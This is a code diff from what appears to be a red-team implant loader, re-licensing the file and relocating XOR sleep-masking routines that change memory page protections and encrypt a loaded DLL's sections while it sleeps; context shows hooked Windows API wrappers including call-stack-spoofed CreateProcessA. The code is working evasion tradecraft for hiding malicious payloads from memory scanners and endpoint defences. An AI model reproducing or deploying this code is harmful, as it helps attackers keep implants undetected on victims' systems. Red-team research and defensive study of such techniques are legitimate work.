@@ -1,20 +1,29 @@
 /*
- * Copyright (C) 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
+ * Copyright 2025 Daniel Duggan, Zero-Point Security
  *
- * This file is part of Tradecraft Garden
+ * Redistribution and use in source and binary forms, with or without modification, are
+ * permitted provided that the following conditions are met:
  *
- * This program is free software; you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation; either version 2 of the License, or
- * (at your option) any later version.
+ * 1. Redistributions of source code must retain the above copyright notice, this list of
+ * conditions and the following disclaimer.
  *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
+ * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
+ * conditions and the following disclaimer in the documentation and/or other materials provided
+ * with the distribution.
  *
- *  You should have received a copy of the GNU General Public License along
- *  with this program; if not, see <https://www.gnu.org/licenses/>.
+ * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
+ * endorse or promote products derived from this software without specific prior written
+ * permission.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
+ * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+ * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+ * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
+ * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
+ * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
+ * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
 #include <windows.h>
@@ -31,7 +40,7 @@ void * g_ExitThread;
 char xorkey[128] = { 1 };
 
 /* some globals */
-MEMORY_LAYOUT         g_layout;
+MEMORY_LAYOUT g_layout;
 
 LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
 {
@@ -597,6 +606,55 @@ BOOL WINAPI _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSEC
     return (BOOL)draugr(&call);
 }
 
+void applyxor(char * data, DWORD len)
+{
+    for (DWORD x = 0; x < len; x++) {
+        data[x] ^= xorkey[x % 128];
+    }
+}
+
+BOOL isWriteable(DWORD protection)
+{
+    if (protection == PAGE_EXECUTE_READWRITE || protection == PAGE_EXECUTE_WRITECOPY || protection == PAGE_READWRITE || protection == PAGE_WRITECOPY) {
+        return TRUE;
+    }
+    return FALSE;
+}
+
+void xorsection(MEMORY_SECTION * section, BOOL mask)
+{
+    if (mask == TRUE && isWriteable(section->currentProtect) == FALSE) {
+        DWORD oldProtect = 0;
+        if (_VirtualProtect(section->baseAddress, section->size, PAGE_READWRITE, &oldProtect)) {
+            section->currentProtect  = PAGE_READWRITE;
+            section->previousProtect = oldProtect;
+        }
+    }
+
+    if (isWriteable(section->currentProtect)) {
+        applyxor(section->baseAddress, section->size);
+    }
+
+    if (mask == FALSE && section->currentProtect != section->previousProtect) {
+        DWORD oldProtect;
+        if (_VirtualProtect(section->baseAddress, section->size, section->previousProtect, &oldProtect)) {
+            section->currentProtect  = section->previousProtect;
+            section->previousProtect = oldProtect;
+        }
+    }
+}
+
+void xorregion(MEMORY_REGION * region, BOOL mask)
+{
+    for (int i = 0; i < 5; i++) {
+        xorsection(&region->sections[i], mask);
+    }
+}
+
+void xormemory(BOOL mask) {
+    xorregion(&g_layout.dll, mask);
+}
+
 VOID WINAPI _Sleep(DWORD dwMilliseconds)
 {
     #if DEBUG
@@ -743,55 +801,6 @@ char * WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
     }
 
     return result;
-}
-
-void applyxor(char * data, DWORD len)
-{
-    for (DWORD x = 0; x < len; x++) {
-        data[x] ^= xorkey[x % 128];
-    }
-}
-
-BOOL isWriteable(DWORD protection)
-{
-    if (protection == PAGE_EXECUTE_READWRITE || protection == PAGE_EXECUTE_WRITECOPY || protection == PAGE_READWRITE || protection == PAGE_WRITECOPY) {
-        return TRUE;
-    }
-    return FALSE;
-}
-
-void xorsection(MEMORY_SECTION * section, BOOL mask)
-{
-    if (mask == TRUE && isWriteable(section->currentProtect) == FALSE) {
-        DWORD oldProtect = 0;
-        if (_VirtualProtect(section->baseAddress, section->size, PAGE_READWRITE, &oldProtect)) {
-            section->currentProtect  = PAGE_READWRITE;
-            section->previousProtect = oldProtect;
-        }
-    }
-
-    if (isWriteable(section->currentProtect)) {
-        applyxor(section->baseAddress, section->size);
-    }
-
-    if (mask == FALSE && section->currentProtect != section->previousProtect) {
-        DWORD oldProtect;
-        if (_VirtualProtect(section->baseAddress, section->size, section->previousProtect, &oldProtect)) {
-            section->currentProtect  = section->previousProtect;
-            section->previousProtect = oldProtect;
-        }
-    }
-}
-
-void xorregion(MEMORY_REGION * region, BOOL mask)
-{
-    for (int i = 0; i < 5; i++) {
-        xorsection(&region->sections[i], mask);
-    }
-}
-
-void xormemory(BOOL mask) {
-    xorregion(&g_layout.beacon, mask);
 }
 
 void go(IMPORTFUNCS * funcs, MEMORY_LAYOUT * layout)
